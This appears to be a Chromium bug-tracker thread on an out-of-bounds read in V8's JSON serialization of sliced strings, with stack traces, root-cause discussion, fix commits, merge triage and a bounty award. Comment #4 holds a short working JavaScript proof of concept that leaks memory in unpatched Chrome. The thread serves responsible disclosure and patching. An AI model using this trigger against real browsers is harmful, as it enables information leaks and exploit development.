# OOB read in JsonStringifier::SerializeString

Issue URL: https://issues.chromium.org/issues/398999390
VRP-Reward: 2000
Date: Feb 25, 2025 06:25PM


VULNERABILITY DETAILS

After updating the parent of a SlicedString, its map object may become outdated, leading to Out-of-Band memory reads during JSON serialization.

VERSION

V8 commit: be6d95e1118064c533c56e0547627374bd2bd434

REPRODUCTION CASE

Build args:

```
is_component_build = false
is_debug = false
target_cpu = "arm64"
v8_target_cpu = "arm64"
v8_enable_sandbox = true
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
v8_enable_verify_heap = true
dcheck_always_on = false
```

Shell args:

```
./out/arm64.release/d8 --allow-natives-syntax bug.js
```

Shell output:

```
expect:  "bbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
found:  "扢扢扢扢扢扢扢扢扢扢扢扢扢扢啢\u0001切Β\u0000猀牴唀\u0001昀Ἤߺ\u0000猀"
```

CREDIT INFORMATION Reporter credit: [zeroxiaobai@gmail.com](<mailto:zeroxiaobai@gmail.com>)


---

**#2 — ze...@gmail.com — Feb 25, 2025 06:27PM**

Here is a DCHECK in debug version:

```
#
# Fatal error in ../../src/objects/string-inl.h, line 1125
# Debug check failed: flat.IsTwoByte().
#
#
#
#FailureMessage Object: 0x16ce43318
==== C stack trace ===============================

    0   libv8_libbase.dylib                 0x000000010382afd8 v8::base::debug::StackTrace::StackTrace() + 32
    1   libv8_libbase.dylib                 0x000000010382b014 v8::base::debug::StackTrace::StackTrace() + 28
    2   libv8_libplatform.dylib             0x0000000103983cb0 v8::platform::(anonymous namespace)::PrintStackTrace() + 60
    3   libv8_libbase.dylib                 0x00000001037fec70 V8_Fatal(char const*, int, char const*, ...) + 352
    4   libv8_libbase.dylib                 0x00000001037fe628 v8::base::SetFatalFunction(void (*)(char const*, int, char const*)) + 0
    5   libv8_libbase.dylib                 0x00000001037fed7c V8_Dcheck(char const*, int, char const*) + 108
    6   libv8.dylib                         0x000000011614ba74 v8::base::Vector<unsigned short const> v8::internal::String::GetCharVector<unsigned short>(v8::internal::PerThreadAssertScope<false, (v8::internal::PerThreadAssertType)1, (v8::internal::PerThreadAssertType)2> const&) + 120
    7   libv8.dylib                         0x000000011616bbac bool v8::internal::JsonStringifier::SerializeString_<unsigned short, unsigned short, false>(v8::internal::Tagged<v8::internal::String>, v8::internal::PerThreadAssertScope<false, (v8::internal::PerThreadAssertType)1, (v8::internal::PerThreadAssertType)2> const&) + 124
    8   libv8.dylib                         0x000000011614265c bool v8::internal::JsonStringifier::SerializeString<false>(v8::internal::Handle<v8::internal::String>) + 436
    9   libv8.dylib                         0x00000001161460e0 v8::internal::JsonStringifier::Result v8::internal::JsonStringifier::Serialize_<false>(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, bool, v8::internal::Handle<v8::internal::Object>) + 2700
    10  libv8.dylib                         0x00000001161406c8 v8::internal::JsonStringifier::SerializeObject(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>) + 100
    11  libv8.dylib                         0x000000011613f5fc v8::internal::JsonStringifier::Stringify(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, v8::internal::Handle<v8::internal::Object>) + 332
    12  libv8.dylib                         0x0000000116144b8c v8::internal::JsonStringify(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, v8::internal::Handle<v8::internal::Object>) + 212
    13  libv8.dylib                         0x00000001153c89c4 v8::internal::Builtin_Impl_JsonStringify(v8::internal::BuiltinArguments, v8::internal::Isolate*) + 396
    14  libv8.dylib                         0x00000001153c85ec v8::internal::Builtin_JsonStringify(int, unsigned long*, v8::internal::Isolate*) + 268
    15  ???                                 0x0000000157a76f30 0x0 + 5765558064
    16  ???                                 0x00000001577f2498 0x0 + 5762917528
    17  ???                                 0x00000001577ebd18 0x0 + 5762891032
    18  ???                                 0x00000001577eb954 0x0 + 5762890068
    19  libv8.dylib                         0x00000001158a10f8 v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) + 76
    20  libv8.dylib                         0x000000011589e1b8 v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) + 3916
    21  libv8.dylib                         0x000000011589e88c v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) + 404
    22  libv8.dylib                         0x000000011514af64 v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) + 1080
    23  libv8.dylib                         0x000000011514aaf0 v8::Script::Run(v8::Local<v8::Context>) + 80
    24  d8                                  0x0000000102fff738 v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) + 2232
    25  d8                                  0x00000001030210c8 v8::SourceGroup::Execute(v8::Isolate*) + 1044
    26  d8                                  0x0000000103027788 v8::Shell::RunMainIsolate(v8::Isolate*, bool) + 556
    27  d8                                  0x0000000103027240 v8::Shell::RunMain(v8::Isolate*, bool) + 252
    28  d8                                  0x0000000103029974 v8::Shell::Main(int, char**) + 3304
    29  d8                                  0x000000010302a2ec main + 36
    30  dyld                                0x00000001856ff154 start + 2476
```


---

**#3 — ze...@gmail.com — Feb 25, 2025 06:58PM**

```
void SlicedString::set_parent(Tagged<String> parent, WriteBarrierMode mode) {
  DCHECK(IsSeqString(parent) || IsExternalString(parent));
  parent_.store(this, parent, mode);
}
```

It appears that the parent of a SlicedString should not be a ThinString, yet after internalization, its parent indeed becomes a ThinString.

I couldn't find an appropriate place to update the map object of SlicedString (perhaps it could be done in String::Flatten?), or maybe the String::IsOneByteRepresentation() method shouldn't use the SlicedString's own map object?


---

**#4 — ze...@gmail.com — Feb 25, 2025 10:31PM**

Update：

You can also directly reproduce it in the browser using the code below, without using d8.

```
    const internalizedString = "aaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
    const uint16Array = new Uint16Array([97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 97, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98, 98]);
    const decoder = new TextDecoder('utf-16');
    const str = decoder.decode(uint16Array);

    const [sub_str] = /b+/.exec(str);

    console.log('expect: ', JSON.stringify(sub_str));

    const map = {}; map[str];

    console.log('found: ', JSON.stringify(sub_str));
```

Chrome version: 133.0.6943.127 (The latest stable version)


---

**#5 — hc...@google.com — Feb 26, 2025 12:27AM**

assigning to ishell@ as v8 sherriff.

Foundin and severity are provisional. OS is set to Android for now since the instructions are to build on ARM, unsure if that's accurate.


---

**#6 — pt...@chromium.org — Feb 26, 2025 08:43PM**

Thanks for the report!  
This is not an issue with `ThinStrings` being the parent of a `SlicedString` (this is fine), but rather that on the API we still allow creation of 2-byte strings with 1-byte only contents.  
Indirect strings (`SlicedString`/`ConsString`) created on top of these strings with "incorrect" encoding will be 2-byte as well. When such a string gets internalized with a string-table hit, the string itself will become a 1-byte `ThinString`.

We recently removed handling of such cases [1] as we missed this scenario and otherwise prevented that case (i.e. for `ExternalString`s). The CL landed in M133

[1] [https://crrev.com/c/6011010](<https://crrev.com/c/6011010>)


---

**#7 — ch...@google.com — Feb 26, 2025 09:37PM**

Setting milestone because of s0/s1 severity.


---

**#8 — ap...@google.com — Feb 26, 2025 11:22PM**

Project: v8/v8  
Branch: main  
Author: pthier <[pthier@chromium.org](<mailto:pthier@chromium.org>)>  
Link: [https://chromium-review.googlesource.com/6304799](<https://chromium-review.googlesource.com/6304799>)

Revert "[string] Remove String::IsOneByteRepresentationUnderneath"

* * *

Expand for full commit details

```
Revert "[string] Remove String::IsOneByteRepresentationUnderneath" 
 
This reverts commit e3f33e99674eab3881d2d65b82dfe436829bb831. 
 
Reason for revert: https://crbug.com/398999390 
 
This only reverts the fist part of the CL (Removing IsOneByteRepresentation). 
Using static roots to determine one-byte representation from the map word alone is kept. 
 
Original change's description: 
> [string] Remove String::IsOneByteRepresentationUnderneath 
> 
> All string maps are split into one- and two-byte versions, and enforce 
> that their underlying string must have the same byte width (e.g. we 
> can't change byteness when externalizing). This means that the old 
> IsOneByteRepresentationUnderneath loop is no longer needed, as we 
> already know the byteness from the top. 
> 
> Remove this function, replacing with calls to IsOneByteRepresentation. 
> Additionally, we have some static roots hacks to determine one-byte 
> representation from the map word alone (without needing to dereference 
> the instance type), so use that too where possible. 
> 
> Change-Id: I662daa3cb217d04cbfd717da53ae1238a0bcddd0 
> Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6011010 
> Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
> Reviewed-by: Patrick Thier <pthier@chromium.org> 
> Cr-Commit-Position: refs/heads/main@{#97099} 
 
DISABLE_SPELLCHECKER 
 
Fixed: 398999390 
Change-Id: Iee7e88257cb0d23669bcd7571d57b613a413bc29 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6304799 
Commit-Queue: Patrick Thier <pthier@chromium.org> 
Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#98942}
```

* * *

Files:

  * M `src/builtins/builtins-json.cc`
  * M `src/builtins/builtins-string.cc`
  * M `src/builtins/string-iswellformed.tq`
  * M `src/builtins/string-towellformed.tq`
  * M `src/json/json-stringifier.cc`
  * M `src/numbers/conversions.cc`
  * M `src/objects/instance-type-inl.h`
  * M `src/objects/js-raw-json.cc`
  * M `src/objects/js-regexp.cc`
  * M `src/objects/map-inl.h`
  * M `src/objects/map.h`
  * M `src/objects/string-inl.h`
  * M `src/objects/string.h`
  * M `src/objects/string.tq`
  * M `src/objects/templates-inl.h`
  * M `src/regexp/experimental/experimental-interpreter.cc`
  * M `src/regexp/regexp-interpreter.cc`
  * M `src/regexp/regexp-macro-assembler.cc`
  * M `src/regexp/regexp.cc`
  * M `src/runtime/runtime-strings.cc`
  * M `src/strings/string-builder.cc`
  * M `src/strings/uri.cc`

* * *

Hash: 8db16e651ff456e0eea6e576045623d2039a1d34  
Date: Wed Feb 26 14:11:04 2025

* * *


---

**#9 — ap...@google.com — Feb 27, 2025 09:01PM**

[Details redacted due to bug visibility]  
  
Change-Id: I965d389444671e93f56692c3787838affab32c90  
[https://chrome-internal-review.googlesource.com/8063035](<https://chrome-internal-review.googlesource.com/8063035>)


---

**#10 — ch...@google.com — Feb 27, 2025 09:45PM**

Security Merge Request Consideration: This is sufficiently serious that it should be merged to other stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M133. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately. Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M134. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately. Security Merge Request - Manual Review: Merge review required: a reverted commit was detected after the merge request.

Security Merge Request - Manual Review: Merge review required: a reverted commit was detected after the merge request.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [133, 134].

Please answer the following questions so that we can safely process this merge request:

  1. Which CLs should be backmerged? (Please include Gerrit links.)
  2. Has this fix been verified on Canary to not pose any stability regressions?
  3. Does this fix pose any potential non-verifiable stability risks?
  4. Does this fix pose any known compatibility risks?
  5. Does it require manual verification by the test team? If so, please describe required testing.
  6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!


---

**#11 — ap...@google.com — Feb 27, 2025 09:47PM**

Project: v8/v8  
Branch: main  
Author: pthier <[pthier@chromium.org](<mailto:pthier@chromium.org>)>  
Link: [https://chromium-review.googlesource.com/6304942](<https://chromium-review.googlesource.com/6304942>)

[test] Add createExternalizableTwoByteString to extension

* * *

Expand for full commit details

```
[test] Add createExternalizableTwoByteString to extension 
 
Allow to explicitly create an external 2-byte string for 1-byte only 
contents via the externalize-string extension. 
 
Bug: 398999390 
Change-Id: I1fe11186c686a31e1d68d662af156709967f499f 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6304942 
Commit-Queue: Patrick Thier <pthier@chromium.org> 
Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
Auto-Submit: Patrick Thier <pthier@chromium.org> 
Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#98969}
```

* * *

Files:

  * M `src/extensions/externalize-string-extension.cc`
  * M `src/extensions/externalize-string-extension.h`

* * *

Hash: 812f91c5821259311a8d321b23654e7f74284a52  
Date: Thu Feb 27 12:40:24 2025

* * *


---

**#12 — sr...@google.com — Feb 27, 2025 11:34PM**

Downgrading the severity since this is just an OOB read


---

**#13 — am...@chromium.org — Feb 28, 2025 02:58AM**

OOB reads in the renderer are considered medium severity rather than low


---

**#14 — sr...@google.com — Mar 4, 2025 05:49PM**

As discussed, downgrading to S2 again. This case just reads OOB of a string, so the impact is limited to an info leak.


---

**#15 — pt...@chromium.org — Mar 5, 2025 06:17PM**

Answers to [comment #10](<https://issues.chromium.org/issues/398999390#comment10>):

  1. [https://chromium-review.googlesource.com/6304799](<https://chromium-review.googlesource.com/6304799>)
  2. Yes, on canary since 135.0.7039.0
  3. No
  4. No
  5. No


---

**#16 — sp...@google.com — Mar 6, 2025 09:55AM**

** NOTE: This is an automatically generated email **  
  
Hello,  
  
Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.  
  
Rationale for this decision:  
report of OOB read in a sandbox process / information disclosure  
  
  
Important: If you aren't already registered with Google as a supplier, [p2p-vrp@google.com](<mailto:p2p-vrp@google.com>) will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.  
  
If you have any payment related requests, please direct them to [p2p-vrp@google.com](<mailto:p2p-vrp@google.com>). Please remember to include the subject of this email and the email address that the report was sent from.  
  
  
Thank you for your efforts and helping us make Chrome more secure for all users!  
  
Cheers,  
Chrome VRP Panel Bot  
  
  
P.S. One other thing we'd like to mention:  
  
* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.  
Please contact [security-vrp@chromium.org](<mailto:security-vrp@chromium.org>) with any questions.


---

**#17 — am...@chromium.org — Mar 6, 2025 10:01AM**

Congratulations zeroxiaobai! Thank you for your efforts and reporting this issue to us!


---

**#18 — am...@chromium.org — Mar 7, 2025 02:20AM**

Please feel free to merge this revert into M134 at this time


---

**#19 — sr...@google.com — Mar 7, 2025 12:07PM**

Please complete your M134 merges before Friday March 7th, 2025, 2pm PST , as we are moving the RC cut for desktop to friday ( due to another high priority issue)   
  
If you miss this deadline you will miss RC cut for next week respin


---

**#20 — ap...@google.com — Mar 7, 2025 08:48PM**

Project: v8/v8  
Branch: refs/branch-heads/13.4  
Author: pthier <[pthier@chromium.org](<mailto:pthier@chromium.org>)>  
Link: [https://chromium-review.googlesource.com/6330265](<https://chromium-review.googlesource.com/6330265>)

Merged: Revert "[string] Remove String::IsOneByteRepresentationUnderneath"

* * *

Expand for full commit details

```
Merged: Revert "[string] Remove String::IsOneByteRepresentationUnderneath" 
 
This reverts commit e3f33e99674eab3881d2d65b82dfe436829bb831. 
 
Reason for revert: https://crbug.com/398999390 
 
This only reverts the fist part of the CL (Removing IsOneByteRepresentation). 
Using static roots to determine one-byte representation from the map word alone is kept. 
 
Original change's description: 
> [string] Remove String::IsOneByteRepresentationUnderneath 
> 
> All string maps are split into one- and two-byte versions, and enforce 
> that their underlying string must have the same byte width (e.g. we 
> can't change byteness when externalizing). This means that the old 
> IsOneByteRepresentationUnderneath loop is no longer needed, as we 
> already know the byteness from the top. 
> 
> Remove this function, replacing with calls to IsOneByteRepresentation. 
> Additionally, we have some static roots hacks to determine one-byte 
> representation from the map word alone (without needing to dereference 
> the instance type), so use that too where possible. 
> 
> Change-Id: I662daa3cb217d04cbfd717da53ae1238a0bcddd0 
> Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6011010 
> Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
> Reviewed-by: Patrick Thier <pthier@chromium.org> 
> Cr-Commit-Position: refs/heads/main@{#97099} 
 
DISABLE_SPELLCHECKER 
 
Fixed: 398999390 
(cherry picked from commit 8db16e651ff456e0eea6e576045623d2039a1d34) 
 
Change-Id: I2c84f730aa0527b24a3c74090aa92d689cdbe701 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6330265 
Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
Auto-Submit: Patrick Thier <pthier@chromium.org> 
Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.4@{#37} 
Cr-Branched-From: 0f87a54dade4353b6ece1d7591ca8c66f90c1c93-refs/heads/13.4.114@{#1} 
Cr-Branched-From: 27af2e9363b2701abc5f3feb701b1dad7d1a9fe8-refs/heads/main@{#98459}
```

* * *

Files:

  * M `src/builtins/builtins-json.cc`
  * M `src/builtins/builtins-string.cc`
  * M `src/builtins/string-iswellformed.tq`
  * M `src/builtins/string-towellformed.tq`
  * M `src/json/json-stringifier.cc`
  * M `src/numbers/conversions.cc`
  * M `src/objects/js-raw-json.cc`
  * M `src/objects/js-regexp.cc`
  * M `src/objects/map.h`
  * M `src/objects/string-inl.h`
  * M `src/objects/string.h`
  * M `src/objects/string.tq`
  * M `src/objects/templates-inl.h`
  * M `src/regexp/experimental/experimental-interpreter.cc`
  * M `src/regexp/regexp-interpreter.cc`
  * M `src/regexp/regexp-macro-assembler.cc`
  * M `src/regexp/regexp.cc`
  * M `src/runtime/runtime-strings.cc`
  * M `src/strings/string-builder.cc`
  * M `src/strings/uri.cc`

* * *

Hash: c6d88e6d437a9b90268f11708edc8b0fec706ecf  
Date: Fri Mar 07 11:57:40 2025

* * *


---

**#21 — pe...@google.com — Mar 7, 2025 08:58PM**

LTS Milestone M132

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

  1. Was this issue a regression for the milestone it was found in?
  2. Is this issue related to a change or feature merged after the latest LTS Milestone?


---

**#22 — pt...@chromium.org — Mar 7, 2025 09:02PM**

Answers to [comment #21](<https://issues.chromium.org/issues/398999390#comment21>):

  1. Yes
  2. The issue was introduced in M133


---

**#23 — qk...@google.com — Mar 10, 2025 11:45AM**

Labelling as not applicable for LTS 132 and LTS 126, because the suspected CL[1] isn't present in M132/M126 and [comment #6](<https://issues.chromium.org/issues/398999390#comment6>) said it was an M133 regression.  
  
[1] [https://crrev.com/c/6011010](<https://crrev.com/c/6011010>)


---

**#24 — ch...@google.com — Jun 5, 2025 09:39PM**

This bug has been closed for more than 14 weeks. Removing issue access restrictions.
